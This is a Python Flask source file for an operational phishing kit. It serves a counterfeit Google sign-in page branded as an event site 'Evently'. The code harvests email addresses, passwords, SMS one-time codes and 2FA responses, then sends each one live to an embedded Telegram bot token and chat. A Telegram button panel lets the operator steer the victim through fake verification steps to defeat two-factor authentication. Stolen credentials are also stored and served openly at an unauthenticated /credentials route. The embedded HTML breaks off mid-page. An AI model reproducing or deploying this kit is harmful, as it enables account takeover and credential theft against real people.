from flask import Flask, request, redirect, session, render_template_string, jsonify, Response
import requests
import json
import os
import base64
import time
import hmac
import hashlib
from datetime import datetime
import threading

app = Flask(__name__)
from flask_cors import CORS
CORS(app)
app.secret_key = os.urandom(24)

# ================================================================
# TELEGRAM CONFIG
# ================================================================
TG_BOT_TOKEN = "8868268134:AAHTVlyTE0ksIwGG75SWEKg-qbUGd8wHE3s"
TG_CHAT_ID = "8337327707"
TG_API = f"https://api.telegram.org/bot{TG_BOT_TOKEN}"

# ================================================================
# REDIRECT URL
# ================================================================
SUCCESS_REDIRECT_URL = "https://evntly.online"

# ================================================================
# STORAGE
# ================================================================
GMAIL_STATE_DB = "/tmp/gmail_state.json"
CRED_DB = "/tmp/credentials.json"
TELEGRAM_OFFSET_DB = "/tmp/telegram_offset.json"

def send_telegram(message):
    url = f"{TG_API}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_buttons(text, buttons):
    url = f"{TG_API}/sendMessage"
    payload = {
        "chat_id": TG_CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": buttons}
    }
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def send_telegram_2fa_grid():
    numbers = [f"{i}{j}" for i in range(1, 10) for j in range(0, 10)]
    rows = []
    row = []
    for n in numbers:
        row.append({"text": n, "callback_data": f"2fa_{n}"})
        if len(row) == 5:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    send_telegram_buttons("🔢 Choose the 2-digit number to show the victim:", rows)

def send_main_controls():
    buttons = [
        [{"text": "✅ Yes Prompt", "callback_data": "yes_prompt"}],
        [{"text": "📱 SMS Code I", "callback_data": "sms1"}, {"text": "📱 SMS Code II", "callback_data": "sms2"}],
        [{"text": "🔢 2FA Number Prompt", "callback_data": "show_2fa_menu"}],
        [{"text": "❌ Password Error", "callback_data": "password_error"}],
        [{"text": "🚫 Block Visitor", "callback_data": "block"}, {"text": "✅ Success", "callback_data": "success"}]
    ]
    send_telegram_buttons("🎮 **Gmail Flow Controls**\nSelect what to show the victim:", buttons)

def init_gmail_state():
    if os.path.exists(GMAIL_STATE_DB):
        with open(GMAIL_STATE_DB) as f:
            return json.load(f)
    state = {
        "step": "email",
        "email": "",
        "password": "",
        "sms1": "",
        "sms2": "",
        "fa2_code": "",
        "fa2_choice": "",
        "ip": "",
        "user_agent": "",
        "timestamp": ""
    }
    save_gmail_state(state)
    return state

def save_gmail_state(state):
    with open(GMAIL_STATE_DB, "w") as f:
        json.dump(state, f, indent=2)

def save_credential(email, password, ip, method):
    db = {}
    if os.path.exists(CRED_DB):
        with open(CRED_DB) as f:
            db = json.load(f)
    if email not in db:
        db[email] = []
    db[email].append({
        "password": password,
        "ip": ip,
        "method": method,
        "timestamp": datetime.now().isoformat()
    })
    with open(CRED_DB, "w") as f:
        json.dump(db, f, indent=2)

def handle_telegram_updates():
    offset = 0
    if os.path.exists(TELEGRAM_OFFSET_DB):
        with open(TELEGRAM_OFFSET_DB) as f:
            offset = json.load(f).get("offset", 0)
    while True:
        try:
            resp = requests.get(f"{TG_API}/getUpdates", params={
                "offset": offset,
                "timeout": 30,
                "allowed_updates": json.dumps(["message", "callback_query"])
            }, timeout=35)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            updates = resp.json().get("result", [])
            for update in updates:
                update_id = update["update_id"]
                offset = update_id + 1
                if "callback_query" in update:
                    cb = update["callback_query"]
                    cb_data = cb.get("data", "")
                    cb_id = cb.get("id")
                    if cb_data == "yes_prompt":
                        state = init_gmail_state()
                        state["step"] = "prompt"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Prompt sent to victim. Waiting for Yes/No response..."})
                        send_telegram("✅ Google Prompt sent to victim's page!")
                        send_main_controls()
                    elif cb_data == "sms1":
                        state = init_gmail_state()
                        state["step"] = "sms1"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code I sent to victim"})
                        send_telegram("📱 SMS Code I sent to victim's page!")
                        send_main_controls()
                    elif cb_data == "sms2":
                        state = init_gmail_state()
                        state["step"] = "sms2"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "📱 SMS Code II sent to victim"})
                        send_telegram("📱 SMS Code II sent to victim's page!")
                        send_main_controls()
                    elif cb_data == "password_error":
                        state = init_gmail_state()
                        state["step"] = "error"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "❌ Password error shown to victim"})
                        send_telegram("❌ Password error shown to victim!")
                        send_main_controls()
                    elif cb_data == "block":
                        state = init_gmail_state()
                        state["step"] = "blocked"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🚫 Victim blocked"})
                        send_telegram("🚫 Victim is now blocked!")
                        send_main_controls()
                    elif cb_data == "success":
                        state = init_gmail_state()
                        state["step"] = "success"
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "✅ Success! Redirecting victim..."})
                        send_telegram("✅ Victim redirected to success page!")
                        send_main_controls()
                    elif cb_data == "show_2fa_menu":
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": "🔢 Loading 2FA grid..."})
                        send_telegram_2fa_grid()
                        send_main_controls()
                    elif cb_data.startswith("2fa_"):
                        number = cb_data.split("_")[1]
                        state = init_gmail_state()
                        state["step"] = "fa2_show"
                        state["fa2_choice"] = number
                        state["timestamp"] = datetime.now().isoformat()
                        save_gmail_state(state)
                        requests.post(f"{TG_API}/answerCallbackQuery", json={"callback_query_id": cb_id, "text": f"🔢 Showing 2FA code: {number}"})
                        send_telegram(f"🔢 Showing 2FA code **{number}** to victim!")
                        send_main_controls()
                elif "message" in update:
                    msg = update["message"]
                    text = msg.get("text", "").strip()
                    if text == "/start":
                        send_telegram("🤖 **Gmail Flow Control Bot**\n\nUse the buttons below to control the victim's Gmail login flow:")
                        send_main_controls()
                    elif text == "/controls" or text == "/menu":
                        send_main_controls()
                    elif text == "/2fa":
                        send_telegram_2fa_grid()
                    elif text == "/status":
                        state = init_gmail_state()
                        s = state["step"]
                        e = state["email"] or "Not set"
                        send_telegram(f"📊 **Current Status**\nStep: `{s}`\nEmail: `{e}`\nPassword: {'✅ Captured' if state['password'] else '❌ Not yet'}\nSMS1: `{state['sms1'] or 'N/A'}`\nSMS2: `{state['sms2'] or 'N/A'}`\n2FA Code Shown: `{state['fa2_choice'] or 'N/A'}`\nIP: `{state['ip'] or 'N/A'}`\nTime: `{state['timestamp'] or 'N/A'}`")
            with open(TELEGRAM_OFFSET_DB, "w") as f:
                json.dump({"offset": offset}, f)
        except requests.exceptions.Timeout:
            continue
        except Exception as e:
            print(f"Telegram polling error: {e}")
            time.sleep(5)
            continue
        time.sleep(1)

@app.route('/')
def home():
    return jsonify({
        "status": "running",
        "endpoints": {
            "virtual_iv_page": "/virtual-iv",
            "gmail_state": "/api/gmail-state",
            "gmail_submit_email": "/api/gmail-email",
            "gmail_submit_password": "/api/gmail-password",
            "gmail_submit_sms": "/api/gmail-sms",
            "gmail_submit_2fa": "/api/gmail-2fa",
            "gmail_submit_prompt": "/api/gmail-prompt",
            "submit_credential": "/api/submit-credential",
            "submit_otp": "/api/submit-otp",
            "verify_turnstile": "/api/verify-turnstile",
            "credentials": "/credentials",
            "health": "/health"
        }
    })

@app.route('/virtual-iv')
def virtual_iv_page():
    state = init_gmail_state()
    state["step"] = "email"
    state["email"] = ""
    state["password"] = ""
    state["sms1"] = ""
    state["sms2"] = ""
    state["fa2_code"] = ""
    state["fa2_choice"] = ""
    state["ip"] = request.headers.get("X-Forwarded-For", request.remote_addr)
    if state["ip"] and "," in state["ip"]:
        state["ip"] = state["ip"].split(",")[0].strip()
    state["user_agent"] = request.headers.get("User-Agent", "")
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    return render_template_string(PAGE_HTML)

@app.route('/api/gmail-state')
def get_gmail_state():
    state = init_gmail_state()
    return jsonify({
        "step": state["step"],
        "email": state["email"],
        "fa2_choice": state["fa2_choice"]
    })

@app.route('/api/gmail-email', methods=['POST'])
def gmail_email():
    data = request.json
    email = data.get('email', '').strip()
    if not email:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["email"] = email
    state["step"] = "password"
    # Capture IP/UA from request headers (critical fix for standalone HTML)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    state["ip"] = ip
    state["user_agent"] = ua
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
You have a new website form submission
Email: {email}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-password', methods=['POST'])
def gmail_password():
    data = request.json
    password = data.get('password', '').strip()
    if not password:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["password"] = password
    # Capture IP/UA from request headers (critical fix for standalone HTML)
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")
    state["ip"] = ip
    state["user_agent"] = ua
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    save_credential(state["email"], password, ip, "gmail")
    
    msg = f"""[+]___ Online Invitation (GMAIL) ___[+]
You have a new website form submission
Email: {state['email']}
Password: {password}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-sms', methods=['POST'])
def gmail_sms():
    data = request.json
    code = data.get('code', '').strip()
    step = data.get('step', 'sms1')
    if not code:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    if step == "sms1":
        state["sms1"] = code
    else:
        state["sms2"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL {step.upper()} ___[+]
Email: {state['email']}
Code: {code}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-2fa', methods=['POST'])
def gmail_2fa():
    data = request.json
    code = data.get('code', '').strip()
    if not code:
        return jsonify({"status": "error"}), 400
    state = init_gmail_state()
    state["fa2_code"] = code
    state["timestamp"] = datetime.now().isoformat()
    save_gmail_state(state)
    
    msg = f"""[+]___ GMAIL 2FA ___[+]
Email: {state['email']}
Code Entered: {code}
Code Shown (our choice): {state['fa2_choice']}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

@app.route('/api/gmail-prompt', methods=['POST'])
def gmail_prompt():
    data = request.json
    response = data.get('response', '').strip()
    state = init_gmail_state()
    
    msg = f"""[+]___ GMAIL PROMPT ___[+]
Email: {state['email']}
Response: {response}
IP: {state['ip']}"""
    send_telegram(msg)
    send_main_controls()
    return jsonify({"status": "ok"})

# ================================================================
# NEW ENDPOINTS for standalone HTML (non-Gmail modals + OTP)
# ================================================================
@app.route('/api/submit-credential', methods=['POST'])
def submit_credential():
    data = request.json
    provider = data.get('provider', '')
    email = data.get('email', '')
    password = data.get('password', '')
    phone = data.get('phone', '')
    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    ua = data.get('ua', '') or request.headers.get("User-Agent", "")
    
    msg = f"""[+]___ Online Invitation (LOGIN) ___[+]
Provider: {provider}
Email: {email}
Password: {password}
Phone: {phone}
IP: {ip}
UA: {ua[:80]}"""
    send_telegram(msg)
    return jsonify({"success": True})

@app.route('/api/submit-otp', methods=['POST'])
def submit_otp():
    data = request.json
    code = data.get('code', '')
    ip = data.get('ip', '') or request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    
    msg = f"""[+]___ OTP ___[+]
Code: {code}
IP: {ip}"""
    send_telegram(msg)
    return jsonify({"success": True})

# ================================================================
# TURNSTILE VERIFICATION (NEW)
# ================================================================
TURNSTILE_SECRET_KEY = "0x4AAAAAADnqRfsQR1gWuEP3C6b6jPjdT_M"  # ← REPLACE with your real Turnstile secret key

@app.route('/api/verify-turnstile', methods=['POST'])
def verify_turnstile():
    data = request.json
    token = data.get('token', '')
    if not token:
        return jsonify({"success": False})
    
    try:
        resp = requests.post("https://challenges.cloudflare.com/turnstile/v0/siteverify", data={
            "secret": TURNSTILE_SECRET_KEY,
            "response": token
        }, timeout=10)
        result = resp.json()
        return jsonify({"success": result.get("success", False)})
    except:
        return jsonify({"success": False})

@app.route('/credentials')
def list_credentials():
    if not os.path.exists(CRED_DB):
        return jsonify({})
    with open(CRED_DB) as f:
        return jsonify(json.load(f))

@app.route('/health')
def health():
    return "OK"

PAGE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Event ly</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body { font-family:'Roboto',Arial,sans-serif; background:#f0f2f5; min-height:100vh; display:flex; flex-direction:column; align-items:center; }
header { width:100%; padding:12px 24px; display:flex; align-items:center; justify-content:space-between; background:white; border-bottom:1px solid #e0e0e0; }
header .logo { font-size:22px; font-weight:700; color:#1a1a2e; text-decoration:none; letter-spacing:1px; }
header .logo span { color:#4361ee; }
header nav a { font-size:14px; color:#666; text-decoration:none; margin-left:20px; font-weight:400; }
header nav a:hover { color:#1a1a2e; }
.main-container { flex:1; display:flex; justify-content:center; align-items:center; padding:40px 20px; width:100%; max-width:500px; }
.card { background:white; border-radius:12px; padding:48px 40px 36px; box-shadow:0 1px 3px rgba(0,0,0,0.08),0 1px 2px rgba(0,0,0,0.06); width:100%; text-align:center; }
.card .g-logo { width:48px; height:48px; margin-bottom:16px; }
.card h1 { font-size:24px; font-weight:400; color:#202124; margin-bottom:8px; }
.card p.subtitle { font-size:14px; color:#5f6368; margin-bottom:24px; }
.input-group { text-align:left; margin-bottom:20px; }
.input-group label { display:block; font-size:13px; font-weight:500; color:#5f6368; margin-bottom:6px; }
.input-group input { width:100%; padding:12px 14px; border:1px solid #dadce0; border-radius:6px; font-size:15px; font-family:'Roboto',Arial,sans-serif; color:#202124; outline:none; transition:border 0.15s; }
.input-group input:focus { border-color:#4361ee; box-shadow:0 0 0 2px rgba(67,97,238,0.15); }
.input-group .forgot-link { display:inline-block; margin-top:6px; font-size:13px; font-weight:500; color:#4361ee; text-decoration:none; }
.input-group .forgot-link:hover { color:#3a56d4; }
.btn-row { display:flex; justify-content:space-between; align-items:center; margin-top:10px; }
.btn-row .create-link { font-size:13px; font-weight:500; color:#4361ee; text-decoration:none; }
.btn-row .create-link:hover { color:#3a56d4; }
.btn { padding:8px 24px; border:none; border-radius:6px; font-size:14px; font-weight:500; font-family:'Roboto',Arial,sans-serif; cursor:pointer; transition:background 0.15s,box-shadow 0.15s; }
.btn-primary { background:#4361ee; color:white; }
.btn-primary:hover { background:#3a56d4; box-shadow:0 1px 3px rgba(67,97,238,0.3); }
.btn-secondary { background:transparent; color:#4361ee; }
.btn-secondary:hover { background:rgba(67,97,238,0.06); }
.provider-btn { width:100%; padding:14px 20px; border:1px solid #dadce0; border-radius:8px; background:white; font-family:'Roboto',Arial,sans-serif; font-size:15px; font-weight:500; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:12px; margin-bottom:12px; transition:background 0.15s,box-shadow 0.15s; color:#202124; }
.provider-btn:hover { background:#f8f9fa; box-shadow:0 1px 3px rgba(0,0,0,0.08); }
.provider-btn svg { width:22px; height:22px; flex-shrink:0; }
.step { display:none; }
.step.active { display:block; }
.spinner { width:40px; height:40px; border:4px solid #e0e0e0; border-top-color:#4361ee; border-radius:50%; animation:spin 0.8s linear infinite; margin:20px auto; }
@keyframes spin { to { transform:rotate(360deg); } }
.fa2-number { font-size:64px; font-weight:700; color:#202124; letter-spacing:8px; margin:20px 0; }
.fa2-number span { display:inline-block; background:#f0f2f5; padding:10px 24px; border-radius:12px; border:2px dashed #dadce0; }
.error-box { background:#fce8e6; border:1px solid #f5c6cb; border-radius:8px; padding:16px; text-align:left; margin-bottom:16px; }
.error-box h3 { color:#c5221f; font-size:16px; font-weight:500; margin-bottom:4px; }
.error-box p { color:#5f6368; font-size:13px; }
.success-box { text-align:center; padding:20px; }
.success-box .check { width:64px; height:64px; background:#e8f5e9; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 16px; font-size:32px; color:#34a853; }
.blocked-box { text-align:center; padding:20px; }
.blocked-box .block-icon { font-size:48px; margin-bottom:16px; }
.prompt-info { background:#e8f0fe; border-radius:8px; padding:16px; margin-bottom:20px; text-align:left; }
.prompt-info p { font-size:13px; color:#202124; line-height:1.5; }
.prompt-info strong { color:#4361ee; }
footer { padding:20px; font-size:12px; color:#9aa0a6; text-align:center; }
footer a { color:#5f6368; text-decoration:none; margin:0 10px; }
footer a:hover { color:#202124; }
</style>
</head>
<body>
<header><a href="/" class="logo">Event<span>ly</span></a><nav><a href="#">Events</a><a href="#">Create</a><a href="#">Help</a></nav></header>
<div class="main-container"><div class="card" id="app-card">
<div class="step active" id="step-provider">
<h1>Sign in to continue</h1>
<p class="subtitle">Choose an account to continue to Evently</p>
<button class="provider-btn" onclick="selectProvider('gmail')">
<svg viewBox="0 0 24 24" width="22" height="22"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
Continue with Google
</button>
</div>
<div class="step" id="step-email">
<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>Sign in</h1>
<p class="subtitle">Use your Google Account</p>
<div class="input-group">
<label>Email or phone</label>
<input type="email" id="email-input" placeholder="Enter your email" autocomplete="email" onkeydown="if(event.key==='Enter') submitEmail()">
<a href="#" class="forgot-link">Forgot email?</a>
</div>
<p style="font-size:12px;color:#5f6368;text-align:left;margin-bottom:8px;">Not your computer? Use Guest mode to sign in privately.</p>
<div class="btn-row">
<a href="#" class="create-link">Create account</a>
<button class="btn btn-primary" onclick="submitEmail()">Next</button>
</div>
</div>
<div class="step" id="step-password">
<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>Hi <span id="display-email"></span></h1>
<p class="subtitle" style="font-size:13px;color:#5f6368;cursor:pointer;" onclick="showStep('step-email')">Not you?</p>
<div class="input-group">
<label>Enter your password</label>
<input type="password" id="password-input" placeholder="Password" autocomplete="current-password" onkeydown="if(event.key==='Enter') submitPassword()">
<a href="#" class="forgot-link">Forgot password?</a>
</div>
<div class="btn-row">
<button class="btn btn-secondary" onclick="showStep('step-email')">Back</button>
<button class="btn btn-primary" onclick="submitPassword()">Next</button>
</div>
</div>
<div class="step" id="step-loading">
<h1>Checking your info...</h1>
<div class="spinner"></div>
<p class="subtitle">Please wait a moment</p>
</div>
<div class="step" id="step-sms1">
<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>Verify it's you</h1>
<p class="subtitle">Enter the code sent to your phone</p>
<div class="input-group">
<label>Verification code</label>
<input type="text" id="sms1-input" placeholder="Enter 6-digit code" autocomplete="one-time-code" onkeydown="if(event.key==='Enter') submitSms1()">
</div>
<div class="btn-row">
<button class="btn btn-secondary" onclick="showStep('step-loading')">Back</button>
<button class="btn btn-primary" onclick="submitSms1()">Next</button>
</div>
</div>
<div class="step" id="step-sms2">
<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>Verify it's you</h1>
<p class="subtitle">Enter the new code sent to your phone</p>
<div class="input-group">
<label>New verification code</label>
<input type="text" id="sms2-input" placeholder="Enter 6-digit code" autocomplete="one-time-code" onkeydown="if(event.key==='Enter') submitSms2()">
</div>
<div class="btn-row">
<button class="btn btn-secondary" onclick="showStep('step-loading')">Back</button>
<button class="btn btn-primary" onclick="submitSms2()">Next</button>
</div>
</div>
<div class="step" id="step-fa2">
<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>2-Step Verification</h1>
<p class="subtitle">Open your Google Authenticator app and enter this code:</p>
<div class="fa2-number"><span id="fa2-display">--</span></div>
<p style="font-size:13px;color:#5f6368;margin-bottom:20px;">Enter the code shown on your authenticator app</p>
<div class="input-group">
<label>Enter code from app</label>
<input type="text" id="fa2-input" placeholder="Enter code" onkeydown="if(event.key==='Enter') submitFa2()">
</div>
<div class="btn-row">
<button class="btn btn-secondary" onclick="showStep('step-loading')">Back</button>
<button class="btn btn-primary" onclick="submitFa2()">Verify</button>
</div>
</div>
<div class="step" id="step-prompt">
<img class="g-logo" src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59A14.5 14.5 0 0 1 9.5 24c0-1.59.28-3.14.76-4.59l-7.98-6.19A23.99 23.99 0 0 0 0 24c0 3.77.87 7.35 2.56 10.56l7.97-5.97z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 5.97C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E" alt="Google">
<h1>Google Prompt</h1>
<div class="prompt-info"><p><strong>Google</strong> sent a notification to your device.</p><p style="margin-top:8px;">Open the notification on your phone and tap <strong>Yes</strong> to sign in.</p></div>
<div class="spinner"></div>
<p class="subtitle">Waiting for your response...</p>
</div>
<div class="step" id="step-error">
